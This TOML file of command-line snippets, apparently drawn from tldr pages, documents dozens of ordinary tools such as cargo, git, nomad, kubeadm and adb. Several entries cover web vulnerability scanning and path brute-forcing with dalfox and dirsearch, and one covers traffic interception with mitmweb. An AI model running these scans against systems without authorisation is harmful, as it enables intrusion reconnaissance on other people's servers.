[[snippets]]
  description = "Specify the target directory for pushing files to device by drag and drop (non-APK)"
  command = "scrcpy --push-target <path/to/directory>"
  output = ""

[[snippets]]
  description = "Fill a fake flash drive with a single partition that matches its real capacity"
  command = "sudo f3fix </dev/device_name>"
  output = ""

[[snippets]]
  description = "Mark the partition as bootable"
  command = "sudo f3fix --boot </dev/device_name>"
  output = ""

[[snippets]]
  description = "Specify the filesystem"
  command = "sudo f3fix --fs-type=<filesystem_type> </dev/device_name>"
  output = ""

[[snippets]]
  description = "Scan a single URL for XSS vulnerabilities"
  command = "dalfox url <http://example.com>"
  output = ""

[[snippets]]
  description = "Scan a URL using a header for authentication"
  command = "dalfox url <http://example.com> -H <'X-My-Header: 123'>"
  output = ""

[[snippets]]
  description = "Scan a list of URLs from a file"
  command = "dalfox file <path/to/file>"
  output = ""

[[snippets]]
  description = "Start a server from a specific directory"
  command = "browser-sync start --server <path/to/directory> --files <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start a server from local directory, watching all CSS files in a directory"
  command = "browser-sync start --server --files '<path/to/directory/*.css>'"
  output = ""

[[snippets]]
  description = "Create configuration file"
  command = "browser-sync init"
  output = ""

[[snippets]]
  description = "Start Browsersync from configuration file"
  command = "browser-sync start --config <config_file>"
  output = ""

[[snippets]]
  description = "Remove grey shadows from a PGM image"
  command = "pgmdeshadow <path/to/input_file.pgm> > <path/to/output_file.pgm>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr pamtopnm"
  output = ""

[[snippets]]
  description = "Generate a configuration file on very first run and display help"
  command = "spicetify"
  output = ""

[[snippets]]
  description = "Backup and preprocess Spotify application files"
  command = "spicetify backup"
  output = ""

[[snippets]]
  description = "Print all configuration fields and values"
  command = "spicetify config"
  output = ""

[[snippets]]
  description = "Change the value of a configuration field"
  command = "spicetify config <field> <value>"
  output = ""

[[snippets]]
  description = "Apply the customization changes to Spotify"
  command = "spicetify apply"
  output = ""

[[snippets]]
  description = "Restore Spotify to its original state"
  command = "spicetify restore"
  output = ""

[[snippets]]
  description = "List all Linodes"
  command = "linode-cli linodes list"
  output = ""

[[snippets]]
  description = "View documentation for managing Linode accounts"
  command = "tldr linode-cli account"
  output = ""

[[snippets]]
  description = "View documentation for managing Linodes"
  command = "tldr linode-cli linodes"
  output = ""

[[snippets]]
  description = "View documentation for managing Linode Kubernetes Engine (LKE) clusters"
  command = "tldr linode-cli lke"
  output = ""

[[snippets]]
  description = "View documentation for managing NodeBalancers"
  command = "tldr linode-cli nodebalancers"
  output = ""

[[snippets]]
  description = "View documentation for managing Object Storage"
  command = "tldr linode-cli object-storage"
  output = ""

[[snippets]]
  description = "View documentation for managing domains and DNS configuration"
  command = "tldr linode-cli domains"
  output = ""

[[snippets]]
  description = "View documentation for managing Linode Volumes"
  command = "tldr linode-cli volumes"
  output = ""

[[snippets]]
  description = "Render a `png` image with a filename based on the input filename and output format (uppercase -O)"
  command = "twopi -T <png> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `svg` image with the specified output filename (lowercase -o)"
  command = "twopi -T <svg> -o <path/to/image.svg> <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render the output in `ps`, `pdf`, `svg`, `fig`, `png`, `gif`, `jpg`, `json`, or `dot` format"
  command = "twopi -T <format> -O <path/to/input.gv>"
  output = ""

[[snippets]]
  description = "Render a `gif` image using `stdin` and `stdout`"
  command = "echo ""<digraph {this -> that} >"" | twopi -T <gif> > <path/to/image.gif>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "twopi -?"
  output = ""

[[snippets]]
  description = "Initialize a Rust project with a binary target in the current directory"
  command = "cargo init"
  output = ""

[[snippets]]
  description = "Initialize a Rust project with a binary target in the specified directory"
  command = "cargo init <path/to/directory>"
  output = ""

[[snippets]]
  description = "Initialize a Rust project with a library target in the current directory"
  command = "cargo init --lib"
  output = ""

[[snippets]]
  description = "Initialize a version control system repository in the project directory (default: `git`)"
  command = "cargo init --vcs <git|hg|pijul|fossil|none>"
  output = ""

[[snippets]]
  description = "Set the package name (default: directory name)"
  command = "cargo init --name <name>"
  output = ""

[[snippets]]
  description = "Test the conformance of one or more files in quiet mode"
  command = "cupstestppd -q <path/to/file1.ppd path/to/file2.ppd ...>"
  output = ""

[[snippets]]
  description = "Get the PPD file from `stdin`, showing detailed conformance testing results"
  command = "cupstestppd -v - < <path/to/file.ppd>"
  output = ""

[[snippets]]
  description = "Test all PPD files under the current directory, printing the names of each file that does not conform"
  command = "find . -name \*.ppd \! -execdir cupstestppd -q '{}' \; -print"
  output = ""

[[snippets]]
  description = "Show logged-in users info"
  command = "w"
  output = ""

[[snippets]]
  description = "Show logged-in users info without a header"
  command = "w -h"
  output = ""

[[snippets]]
  description = "Print lines of code in the current directory"
  command = "loc"
  output = ""

[[snippets]]
  description = "Print lines of code in the target directory"
  command = "loc <path/to/directory>"
  output = ""

[[snippets]]
  description = "Print lines of code with stats for individual files"
  command = "loc --files"
  output = ""

[[snippets]]
  description = "Print lines of code without .gitignore (etc.) files (e.g. two -u flags will additionally count hidden files and dirs)"
  command = "loc -u"
  output = ""

[[snippets]]
  description = "Initialize a new documentation in the current directory"
  command = "docsify init"
  output = ""

[[snippets]]
  description = "Initialize a new documentation in the specified directory"
  command = "docsify init <path/to/directory>"
  output = ""

[[snippets]]
  description = "Serve local documentation on `localhost:3000` with live reload"
  command = "docsify serve <path/to/directory>"
  output = ""

[[snippets]]
  description = "Serve local documentation on `localhost` at the specified port"
  command = "docsify serve --port <80> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Generate a sidebar markdown file in the specified directory"
  command = "docsify generate <path/to/directory>"
  output = ""

[[snippets]]
  description = "Read an ICO file and convert the best quality image contained therein to the PAM format"
  command = "winicontopam <path/to/input_file.ico> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Convert all images in the input file to PAM"
  command = "winicontopam -allimages <path/to/input_file.ico> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Convert the n'th image in the input file to PAM"
  command = "winicontopam -image <n> <path/to/input_file.ico> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "If the image(s) to be extracted contain graded transparency data and an AND mask, write the AND mask into the fifth channel of the output PAM file"
  command = "winicontopam -andmasks <path/to/input_file.ico> > <path/to/output.pam>"
  output = ""

[[snippets]]
  description = "Create a new `resume.json` file in the current working directory"
  command = "resume init"
  output = ""

[[snippets]]
  description = "Validate a `resume.json` against schema tests to ensure it complies with the standard"
  command = "resume validate"
  output = ""

[[snippets]]
  description = "Export a resume locally in a stylized HTML or PDF format"
  command = "resume export <path/to/html_or_pdf>"
  output = ""

[[snippets]]
  description = "Start a web server that serves a local `resume.json`"
  command = "resume serve"
  output = ""

[[snippets]]
  description = "Build the package and pass options to `rustc`"
  command = "cargo rustc -- <rustc_options>"
  output = ""

[[snippets]]
  description = "Build artifacts in release mode, with optimizations"
  command = "cargo rustc --release"
  output = ""

[[snippets]]
  description = "Compile with architecture-specific optimizations for the current CPU"
  command = "cargo rustc --release -- -C target-cpu=native"
  output = ""

[[snippets]]
  description = "Compile with speed optimizations"
  command = "cargo rustc -- -C opt-level <1|2|3>"
  output = ""

[[snippets]]
  description = "Compile with [s]ize optimizations (`z` also turns off loop vectorization)"
  command = "cargo rustc -- -C opt-level <s|z>"
  output = ""

[[snippets]]
  description = "Check if your package uses unsafe code"
  command = "cargo rustc --lib -- -D unsafe-code"
  output = ""

[[snippets]]
  description = "Build a specific package"
  command = "cargo rustc --package <package>"
  output = ""

[[snippets]]
  description = "Build only the specified binary"
  command = "cargo --bin <name>"
  output = ""

[[snippets]]
  description = "Convert a Gould scanner file to a PPM image"
  command = "gouldtoppm <path/to/file.gould> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Start GIMP"
  command = "gimp"
  output = ""

[[snippets]]
  description = "Open specific files"
  command = "gimp <path/to/image1 path/to/image2 ...>"
  output = ""

[[snippets]]
  description = "Open specific files in a new window"
  command = "gimp --new-instance <path/to/image1 path/to/image2 ...>"
  output = ""

[[snippets]]
  description = "Start without a splash screen"
  command = "gimp --no-splash"
  output = ""

[[snippets]]
  description = "Print errors and warnings to the console instead of showing them in a dialog box"
  command = "gimp --console-messages"
  output = ""

[[snippets]]
  description = "Enable debugging signal handlers"
  command = "gimp --debug-handlers"
  output = ""

[[snippets]]
  description = "Convert a PYX (ESIS - ISO 8879) document to XML format"
  command = "xml depyx <path/to/input.pyx|URI> > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Convert a PYX document from `stdin` to XML format"
  command = "cat <path/to/input.pyx> | xml depyx > <path/to/output.xml>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "xml depyx --help"
  output = ""

[[snippets]]
  description = "Register the current device to WARP (must be run before first connection)"
  command = "warp-cli register"
  output = ""

[[snippets]]
  description = "Connect to WARP"
  command = "warp-cli connect"
  output = ""

[[snippets]]
  description = "Disconnect from WARP"
  command = "warp-cli disconnect"
  output = ""

[[snippets]]
  description = "Display the WARP connection status"
  command = "warp-cli status"
  output = ""

[[snippets]]
  description = "Switch to a specific mode"
  command = "warp-cli set-mode <mode>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "warp-cli help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "warp-cli help <subcommand>"
  output = ""

[[snippets]]
  description = "Create new files and add them to the index"
  command = "git touch <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Sort a CSV file by column 9"
  command = "csvsort -c <9> <data.csv>"
  output = ""

[[snippets]]
  description = "Sort a CSV file by the "name" column in descending order"
  command = "csvsort -r -c <name> <data.csv>"
  output = ""

[[snippets]]
  description = "Sort a CSV file by column 2, then by column 4"
  command = "csvsort -c <2,4> <data.csv>"
  output = ""

[[snippets]]
  description = "Sort a CSV file without inferring data types"
  command = "csvsort --no-inference -c <columns> <data.csv>"
  output = ""

[[snippets]]
  description = "Restore any files deleted since the last commit"
  command = "git checkout-index --all"
  output = ""

[[snippets]]
  description = "Restore any files deleted or changed since the last commit"
  command = "git checkout-index --all --force"
  output = ""

[[snippets]]
  description = "Restore any files changed since the last commit, ignoring any files that were deleted"
  command = "git checkout-index --all --force --no-create"
  output = ""

[[snippets]]
  description = "Export a copy of the entire tree at the last commit to the specified directory (the trailing slash is important)"
  command = "git checkout-index --all --force --prefix=<path/to/export_directory/>"
  output = ""

[[snippets]]
  description = "Display a report"
  command = "cargo report <future-incompatibilities|...>"
  output = ""

[[snippets]]
  description = "Display a report with the specified Cargo-generated id"
  command = "cargo report <future-incompatibilities|...> --id <id>"
  output = ""

[[snippets]]
  description = "Display a report for the specified package"
  command = "cargo report <future-incompatibilities|...> --package <package>"
  output = ""

[[snippets]]
  description = "Add a package to the project in the current directory"
  command = "dotnet add package <package>"
  output = ""

[[snippets]]
  description = "Add a package to a specific project"
  command = "dotnet add <path/to/file.csproj> package <package>"
  output = ""

[[snippets]]
  description = "Add a specific version of a package to the project"
  command = "dotnet add package <package> --version <1.0.0>"
  output = ""

[[snippets]]
  description = "Add a package using a specific NuGet source"
  command = "dotnet add package <package> --source <https://api.nuget.org/v3/index.json>"
  output = ""

[[snippets]]
  description = "Add a package only when targeting a specific framework"
  command = "dotnet add package <package> --framework <net7.0>"
  output = ""

[[snippets]]
  description = "Add and specify the directory where to restore packages (`~/.nuget/packages` by default)"
  command = "dotnet add package <package> --package-directory <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start `mitmweb` with default settings"
  command = "mitmweb"
  output = ""

[[snippets]]
  description = "Start `mitmweb` bound to a custom address and port"
  command = "mitmweb --listen-host <ip_address> --listen-port <port>"
  output = ""

[[snippets]]
  description = "Start `mitmweb` using a script to process traffic"
  command = "mitmweb --scripts <path/to/script.py>"
  output = ""

[[snippets]]
  description = "Show last 'count' lines in file"
  command = "tail --lines <count> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a file from a specific line number"
  command = "tail --lines +<count> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a specific count of bytes from the end of a given file"
  command = "tail --bytes <count> <path/to/file>"
  output = ""

[[snippets]]
  description = "Print the last lines of a given file and keep reading it until `Ctrl + C`"
  command = "tail --follow <path/to/file>"
  output = ""

[[snippets]]
  description = "Keep reading file until `Ctrl + C`, even if the file is inaccessible"
  command = "tail --retry --follow <path/to/file>"
  output = ""

[[snippets]]
  description = "Show last 'num' lines in 'file' and refresh every 'n' seconds"
  command = "tail --lines <count> --sleep-interval <seconds> --follow <path/to/file>"
  output = ""

[[snippets]]
  description = "Commit changes to all DVC-tracked files and directories"
  command = "dvc commit"
  output = ""

[[snippets]]
  description = "Commit changes to a specified DVC-tracked target"
  command = "dvc commit <target>"
  output = ""

[[snippets]]
  description = "Recursively commit all DVC-tracked files in a directory"
  command = "dvc commit --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Connect to the default X server"
  command = "twm"
  output = ""

[[snippets]]
  description = "Connect to a specific X server"
  command = "twm -display <display>"
  output = ""

[[snippets]]
  description = "Only manage the default screen"
  command = "twm -s"
  output = ""

[[snippets]]
  description = "Use a specific startup file"
  command = "twm -f <path/to/file>"
  output = ""

[[snippets]]
  description = "Enable verbose mode and print unexpected errors in X"
  command = "twm -v"
  output = ""

[[snippets]]
  description = "Search for a package in nixpkgs via its name"
  command = "nix-env -qaP <search_term_regexp>"
  output = ""

[[snippets]]
  description = "Start a shell with the specified packages available"
  command = "nix-shell -p <pkg1 pkg2 pkg3...>"
  output = ""

[[snippets]]
  description = "Install some packages permanently"
  command = "nix-env -iA <nixpkgs.pkg1 nixpkgs.pkg2...>"
  output = ""

[[snippets]]
  description = "Show all dependencies of a store path (package), in a tree format"
  command = "nix-store --query --tree </nix/store/...>"
  output = ""

[[snippets]]
  description = "Update the channels (repositories)"
  command = "nix-channel --update"
  output = ""

[[snippets]]
  description = "Remove unused paths from Nix store"
  command = "nix-collect-garbage"
  output = ""

[[snippets]]
  description = "Start `bpytop`"
  command = "bpytop"
  output = ""

[[snippets]]
  description = "Start in minimal mode without memory and networking boxes"
  command = "bpytop -m"
  output = ""

[[snippets]]
  description = "Toggle minimal mode"
  command = "m"
  output = ""

[[snippets]]
  description = "Search for running programs or processes"
  command = "f"
  output = ""

[[snippets]]
  description = "Change settings"
  command = "M"
  output = ""

[[snippets]]
  description = "Display version"
  command = "bpytop -v"
  output = ""

[[snippets]]
  description = "List all available TeX Live packages, prefexing installed ones with `i`"
  command = "tlmgr info"
  output = ""

[[snippets]]
  description = "List all available collections"
  command = "tlmgr info collections"
  output = ""

[[snippets]]
  description = "List all available schemes"
  command = "tlmgr info scheme"
  output = ""

[[snippets]]
  description = "Show information about a specific package"
  command = "tlmgr info <package>"
  output = ""

[[snippets]]
  description = "List all files contained in a specific package"
  command = "tlmgr info <package> --list"
  output = ""

[[snippets]]
  description = "List all installed packages"
  command = "tlmgr info --only-installed"
  output = ""

[[snippets]]
  description = "Show only specific information about a package"
  command = "tlmgr info <package> --data ""<name>,<category>,<installed>,<size>,<depends>,..."""
  output = ""

[[snippets]]
  description = "Print all available packages as JSON encoded array"
  command = "tlmgr info --json"
  output = ""

[[snippets]]
  description = "Remove an API token from the local credential storage (located in `$CARGO_HOME/credentials.toml`)"
  command = "cargo logout"
  output = ""

[[snippets]]
  description = "Use the specified registry (registry names can be defined in the configuration - the default is <https://crates.io>)"
  command = "cargo logout --registry <name>"
  output = ""

[[snippets]]
  description = "List all running processes"
  command = "ps aux"
  output = ""

[[snippets]]
  description = "List all running processes including the full command string"
  command = "ps auxww"
  output = ""

[[snippets]]
  description = "Search for a process that matches a string"
  command = "ps aux | grep <string>"
  output = ""

[[snippets]]
  description = "List all processes of the current user in extra full format"
  command = "ps --user $(id -u) -F"
  output = ""

[[snippets]]
  description = "List all processes of the current user as a tree"
  command = "ps --user $(id -u) f"
  output = ""

[[snippets]]
  description = "Get the parent PID of a process"
  command = "ps -o ppid= -p <pid>"
  output = ""

[[snippets]]
  description = "Sort processes by memory consumption"
  command = "ps --sort size"
  output = ""

[[snippets]]
  description = "Convert a PPM image to a LEAF file"
  command = "ppmtoleaf <path/to/file.ppm> > <path/to/file.leaf>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "rustup help"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "rustup help <subcommand>"
  output = ""

[[snippets]]
  description = "Connect to a specific database"
  command = "usql <sqlserver|mysql|postgres|sqlite3|...>://<username>:<password>@<host>:<port>/<database_name>"
  output = ""

[[snippets]]
  description = "Execute commands from a file"
  command = "usql --file=<path/to/query.sql>"
  output = ""

[[snippets]]
  description = "Execute a specific SQL command"
  command = "usql --command=""<sql_command>"""
  output = ""

[[snippets]]
  description = "List databases available on the server"
  command = "usql --list-databases"
  output = ""

[[snippets]]
  description = "Run an SQL command in the `usql` prompt"
  command = "<prompt>=> <command>"
  output = ""

[[snippets]]
  description = "Display the database schema"
  command = "<prompt>=> \d"
  output = ""

[[snippets]]
  description = "Export query results to a specific file"
  command = "<prompt>=> \g </path/to/results.txt>"
  output = ""

[[snippets]]
  description = "Import data from a CSV file into a specific table"
  command = "<prompt>=> \copy </path/to/data.csv> <table_name>"
  output = ""

[[snippets]]
  description = "List all active Remote Agents"
  command = "pio remote agent list"
  output = ""

[[snippets]]
  description = "Start a new Remote Agent with a specific name and share it with friends"
  command = "pio remote agent start --name <agent_name> --share <example1@example.com> --share <example2@example.com>"
  output = ""

[[snippets]]
  description = "List devices from specified Agents (omit `--agent` to specify all Agents)"
  command = "pio remote --agent <agent_name1> --agent <agent_name2> device list"
  output = ""

[[snippets]]
  description = "Connect to the serial port of a remote device"
  command = "pio remote --agent <agent_name> device monitor"
  output = ""

[[snippets]]
  description = "Run all targets on a specified Agent"
  command = "pio remote --agent <agent_name> run"
  output = ""

[[snippets]]
  description = "Update installed core packages, development platforms and global libraries on a specific Agent"
  command = "pio remote --agent <agent_name> update"
  output = ""

[[snippets]]
  description = "Run all tests in all environments on a specific Agent"
  command = "pio remote --agent <agent_name> test"
  output = ""

[[snippets]]
  description = "Run a collection (from a file)"
  command = "newman run <path/to/collection.json>"
  output = ""

[[snippets]]
  description = "Run a collection (from a URL)"
  command = "newman run <https://www.getpostman.com/collections/631643-f695cab7-6878-eb55-7943-ad88e1ccfd65-JsLv>"
  output = ""

[[snippets]]
  description = "Show the status of nodes in the cluster"
  command = "nomad node status"
  output = ""

[[snippets]]
  description = "Validate a job file"
  command = "nomad job validate <path/to/file.nomad>"
  output = ""

[[snippets]]
  description = "Plan a job for execution on the cluster"
  command = "nomad job plan <path/to/file.nomad>"
  output = ""

[[snippets]]
  description = "Run a job on the cluster"
  command = "nomad job run <path/to/file.nomad>"
  output = ""

[[snippets]]
  description = "Show the status of jobs currently running on the cluster"
  command = "nomad job status"
  output = ""

[[snippets]]
  description = "Show the detailed status information about a specific job"
  command = "nomad job status <job_name>"
  output = ""

[[snippets]]
  description = "Follow the logs of a specific allocation"
  command = "nomad alloc logs <alloc_id>"
  output = ""

[[snippets]]
  description = "Show the status of storage volumes"
  command = "nomad volume status"
  output = ""

[[snippets]]
  description = "Ping a host"
  command = "ping6 <host>"
  output = ""

[[snippets]]
  description = "Ping a host only a specific number of times"
  command = "ping6 -c <count> <host>"
  output = ""

[[snippets]]
  description = "Ping a host, specifying the interval in seconds between requests (default is 1 second)"
  command = "ping6 -i <seconds> <host>"
  output = ""

[[snippets]]
  description = "Ping a host without trying to lookup symbolic names for addresses"
  command = "ping6 -n <host>"
  output = ""

[[snippets]]
  description = "Ping a host and ring the bell when a packet is received (if your terminal supports it)"
  command = "ping6 -a <host>"
  output = ""

[[snippets]]
  description = "List workloads currently running in the cluster on specific namespace"
  command = "fluxctl --k8s-fwd-ns=<namespace> list-workloads"
  output = ""

[[snippets]]
  description = "Show deployed and available images"
  command = "fluxctl list-images"
  output = ""

[[snippets]]
  description = "Synchronize the cluster with the Git repository"
  command = "fluxctl sync"
  output = ""

[[snippets]]
  description = "Turn on automatic deployment for a workload"
  command = "fluxctl automate"
  output = ""

[[snippets]]
  description = "Download table to local file"
  command = "tunnel download <table_name> <path/to/file>;"
  output = ""

[[snippets]]
  description = "Upload local file to a table partition"
  command = "tunnel upload <path/to/file> <table_name>/<partition_spec>;"
  output = ""

[[snippets]]
  description = "Upload table specifying field and record delimiters"
  command = "tunnel upload <path/to/file> <table_name> -fd <field_delim> -rd <record_delim>;"
  output = ""

[[snippets]]
  description = "Upload table using multiple threads"
  command = "tunnel upload <path/to/file> <table_name> -threads <num>;"
  output = ""

[[snippets]]
  description = "List log groups"
  command = "awslogs groups"
  output = ""

[[snippets]]
  description = "List existing streams for the specified group"
  command = "awslogs streams </var/log/syslog>"
  output = ""

[[snippets]]
  description = "Get logs for any streams in the specified group between 1 and 2 hours ago"
  command = "awslogs get </var/log/syslog> --start='<2h ago>' --end='<1h ago>'"
  output = ""

[[snippets]]
  description = "Get logs that match a specific CloudWatch Logs Filter pattern"
  command = "awslogs get </aws/lambda/my_lambda_group> --filter-pattern='<ERROR>'"
  output = ""

[[snippets]]
  description = "Watch logs for any streams in the specified group"
  command = "awslogs get </var/log/syslog> ALL --watch"
  output = ""

[[snippets]]
  description = "Analyze code using the configuration file (or create one if it does not exist)"
  command = "infection"
  output = ""

[[snippets]]
  description = "Use a specific number of threads"
  command = "infection --threads <number_of_threads>"
  output = ""

[[snippets]]
  description = "Specify a minimum Mutation Score Indicator (MSI)"
  command = "infection --min-msi <percentage>"
  output = ""

[[snippets]]
  description = "Specify a minimum covered code MSI"
  command = "infection --min-covered-msi <percentage>"
  output = ""

[[snippets]]
  description = "Use a specific test framework (defaults to PHPUnit)"
  command = "infection --test-framework <phpunit|phpspec>"
  output = ""

[[snippets]]
  description = "Only mutate lines of code that are covered by tests"
  command = "infection --only-covered"
  output = ""

[[snippets]]
  description = "Display the mutation code that has been applied"
  command = "infection --show-mutations"
  output = ""

[[snippets]]
  description = "Specify the log verbosity"
  command = "infection --log-verbosity <default|all|none>"
  output = ""

[[snippets]]
  description = "Scan a web server for common paths with common extensions"
  command = "dirsearch --url <url> --extensions-list"
  output = ""

[[snippets]]
  description = "Scan a list of web servers for common paths with the `.php` extension"
  command = "dirsearch --url-list <path/to/url-list.txt> --extensions <php>"
  output = ""

[[snippets]]
  description = "Scan a web server for user-defined paths with common extensions"
  command = "dirsearch --url <url> --extensions-list --wordlist <path/to/url-paths.txt>"
  output = ""

[[snippets]]
  description = "Scan a web server using a cookie"
  command = "dirsearch --url <url> --extensions <php> --cookie <cookie>"
  output = ""

[[snippets]]
  description = "Scan a web server using the `HEAD` HTTP method"
  command = "dirsearch --url <url> --extensions <php> --http-method <HEAD>"
  output = ""

[[snippets]]
  description = "Scan a web server, saving the results to a `.json` file"
  command = "dirsearch --url <url> --extensions <php> --json-report <path/to/report.json>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "helix <path/to/file>"
  output = ""

[[snippets]]
  description = "Change the Helix theme"
  command = ":theme <theme_name>"
  output = ""

[[snippets]]
  description = "Save and Quit"
  command = ":wq<Enter>"
  output = ""

[[snippets]]
  description = "Force-quit without saving"
  command = ":q!<Enter>"
  output = ""

[[snippets]]
  description = "Undo the last operation"
  command = "u"
  output = ""

[[snippets]]
  description = "Search for a pattern in the file (press `n`/`N` to go to next/previous match)"
  command = "/<search_pattern><Enter>"
  output = ""

[[snippets]]
  description = "Format the file"
  command = ":format"
  output = ""

[[snippets]]
  description = "Convolve a PNM image with the specified convolution matrix"
  command = "pnmconvol -matrix=-1,3,-1 <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Convolve a PNM image with the convolution matrix in the specified files, one for each layer in the input image"
  command = "pnmconvol -matrixfile <path/to/matrix1,path/to/matrix2,...> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Convolve a PNM image with the convolution matrix in the specified PNM file"
  command = "pnmconvol <path/to/matrix.pnm> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Normalize the weights in the convolution matrix such that they add up to one"
  command = "pnmconvol -matrix=-1,3,-1 -normalize <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Produce three tab-separated columns: lines only in first file, lines only in second file and common lines"
  command = "comm <file1> <file2>"
  output = ""

[[snippets]]
  description = "Print only lines common to both files"
  command = "comm -12 <file1> <file2>"
  output = ""

[[snippets]]
  description = "Print only lines common to both files, reading one file from `stdin`"
  command = "cat <file1> | comm -12 - <file2>"
  output = ""

[[snippets]]
  description = "Get lines only found in first file, saving the result to a third file"
  command = "comm -23 <file1> <file2> > <file1_only>"
  output = ""

[[snippets]]
  description = "Print lines only found in second file, when the files aren't sorted"
  command = "comm -13 <(sort <file1>) <(sort <file2>)"
  output = ""

[[snippets]]
  description = "List all keys for TeX Live"
  command = "tlmgr key list"
  output = ""

[[snippets]]
  description = "Add a key from a specific file"
  command = "sudo tlmgr key add <path/to/key.gpg>"
  output = ""

[[snippets]]
  description = "Add a key from `stdin`"
  command = "cat <path/to/key.gpg> | sudo tlmgr key add -"
  output = ""

[[snippets]]
  description = "Remove a specific key by its ID"
  command = "sudo tlmgr key remove <key_id>"
  output = ""

[[snippets]]
  description = "Start a remote interactive shell on the emulator or device"
  command = "adb shell"
  output = ""

[[snippets]]
  description = "Get all the properties from emulator or device"
  command = "adb shell getprop"
  output = ""

[[snippets]]
  description = "Revert all runtime permissions to their default"
  command = "adb shell pm reset-permissions"
  output = ""

[[snippets]]
  description = "Revoke a dangerous permission for an application"
  command = "adb shell pm revoke <package> <permission>"
  output = ""

[[snippets]]
  description = "Trigger a key event"
  command = "adb shell input keyevent <keycode>"
  output = ""

[[snippets]]
  description = "Clear the data of an application on an emulator or device"
  command = "adb shell pm clear <package>"
  output = ""

[[snippets]]
  description = "Start an activity on emulator or device"
  command = "adb shell am start -n <package>/<activity>"
  output = ""

[[snippets]]
  description = "Start the home activity on an emulator or device"
  command = "adb shell am start -W -c android.intent.category.HOME -a android.intent.action.MAIN"
  output = ""

[[snippets]]
  description = "Apply and commit changes following a local patch file"
  command = "git am <path/to/file.patch>"
  output = ""

[[snippets]]
  description = "Apply and commit changes following a remote patch file"
  command = "curl -L <https://example.com/file.patch> | git apply"
  output = ""

[[snippets]]
  description = "Abort the process of applying a patch file"
  command = "git am --abort"
  output = ""

[[snippets]]
  description = "Apply as much of a patch file as possible, saving failed hunks to reject files"
  command = "git am --reject <path/to/file.patch>"
  output = ""

[[snippets]]
  description = "Install or update a given toolchain"
  command = "rustup install <toolchain>"
  output = ""

[[snippets]]
  description = "Uninstall a toolchain"
  command = "rustup uninstall <toolchain>"
  output = ""

[[snippets]]
  description = "List installed toolchains"
  command = "rustup list"
  output = ""

[[snippets]]
  description = "Create a custom toolchain by symlinking to a directory"
  command = "rustup link <custom_toolchain_name> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Create a Kubernetes master node"
  command = "kubeadm init"
  output = ""

[[snippets]]
  description = "Bootstrap a Kubernetes worker node and join it to a cluster"
  command = "kubeadm join --token <token>"
  output = ""

[[snippets]]
  description = "Create a new bootstrap token with a TTL of 12 hours"
  command = "kubeadm token create --ttl <12h0m0s>"
  output = ""

[[snippets]]
  description = "Check if the Kubernetes cluster is upgradeable and which versions are available"
  command = "kubeadm upgrade plan"
  output = ""

[[snippets]]
  description = "Upgrade Kubernetes cluster to a specified version"
  command = "kubeadm upgrade apply <version>"
  output = ""

[[snippets]]
  description = "View the kubeadm ConfigMap containing the cluster's configuration"
  command = "kubeadm config view"
  output = ""

[[snippets]]
  description = "Revert changes made to the host by 'kubeadm init' or 'kubeadm join'"
  command = "kubeadm reset"
  output = ""

[[snippets]]
  description = "Start MPD"
  command = "mpd"
  output = ""

[[snippets]]
  description = "Start MPD but don't read from the configuration file"
  command = "mpd --no-config"
  output = ""

[[snippets]]
  description = "Start MPD and don't detach it from the console"
  command = "mpd --no-daemon"
  output = ""

[[snippets]]
  description = "Kill the currently running MPD session"
  command = "mpd --kill"
  output = ""

[[snippets]]
  description = "Create MicroVM based on Fedora"
  command = "krunvm create <docker.io/fedora> --cpus <number_of_vcpus> --mem <memory_in_megabytes> --name ""<name>"""
  output = ""

[[snippets]]
  description = "Start a specific image"
  command = "krunvm start ""<image_name>"""
  output = ""

[[snippets]]
  description = "List images"
  command = "krunvm list"
  output = ""

[[snippets]]
  description = "Change a specific image"
  command = "krunvm changevm --cpus <number_of_vcpus> --mem <memory_in_megabytes> --name ""<new_vm_name>"" ""<current_vm_name>"""
  output = ""

[[snippets]]
  description = "Delete a specific image"
  command = "krunvm delete ""<image_name>"""
  output = ""

[[snippets]]
  description = "Wait for a message and display it when received"
  command = "airpaste"
  output = ""

[[snippets]]
  description = "Send text"
  command = "echo <text> | airpaste"
  output = ""

[[snippets]]
  description = "Send a file"
  command = "airpaste < <path/to/file>"
  output = ""

[[snippets]]
  description = "Receive a file"
  command = "airpaste > <path/to/file>"
  output = ""

[[snippets]]
  description = "Create or join a channel"
  command = "airpaste <channel_name>"
  output = ""

[[snippets]]
  description = "Clone an existing repository into a new directory (the default directory is the repository name)"
  command = "git clone <remote_repository_location> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Clone an existing repository and its submodules"
  command = "git clone --recursive <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Clone only the `.git` directory of an existing repository"
  command = "git clone --no-checkout <remote_repository_location>"
  output = ""

[[snippets]]
  description = "Clone a local repository"
  command = "git clone --local <path/to/local/repository>"
  output = ""

[[snippets]]
  description = "Clone quietly"
  command = "git clone --quiet <remote_repository_location>"
  output = ""

[[snippets]]
